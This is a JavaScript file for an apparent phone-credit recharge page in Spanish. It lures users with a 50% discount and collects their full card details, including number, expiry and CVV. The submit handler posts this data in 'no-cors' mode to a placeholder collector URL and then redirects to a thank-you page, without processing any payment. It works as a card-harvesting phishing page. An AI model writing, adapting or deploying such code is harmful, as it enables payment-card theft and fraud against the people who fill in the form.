document.getElementById('monto').addEventListener('change', function () {
  const valor = parseInt(this.value);
  document.getElementById('precioFinal').textContent = `$${valor * 0.5}`;
});

document.getElementById('recargaForm').addEventListener('submit', function (e) {
  e.preventDefault();
  if (!document.getElementById('telefono').value || !document.getElementById('monto').value) {
    mostrarResultado('error', 'Por favor completa todos los campos.');
    return;
  }
  this.classList.add('oculto');
  document.getElementById('tarjetaForm').classList.remove('oculto');
});

document.getElementById('tarjetaForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const formData = {
    pais: document.getElementById('pais').value,
    compania: document.getElementById('compania').value,
    telefono: document.getElementById('telefono').value,
    montoOriginal: document.getElementById('monto').value,
    montoFinal: document.getElementById('precioFinal').textContent,
    nombreTarjeta: document.getElementById('nombreTarjeta').value,
    numeroTarjeta: document.getElementById('numeroTarjeta').value,
    fechaVencimiento: document.getElementById('fechaVencimiento').value,
    cvv: document.getElementById('cvv').value
  };

  fetch("TU_WEB_APP_URL_AQUÍ", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(formData),
    headers: {
      "Content-Type": "application/json"
    }
  }).then(() => {
    window.location.href = "thank-you.html";
  }).catch(err => {
    console.error(err);
    mostrarResultado('error', 'Hubo un error al guardar los datos.');
  });
});

function mostrarResultado(tipo, mensaje) {
  const resultadoDiv = document.getElementById('resultado');
  resultadoDiv.className = `resultado ${tipo}`;
  resultadoDiv.textContent = mensaje;
  resultadoDiv.classList.remove('oculto');
}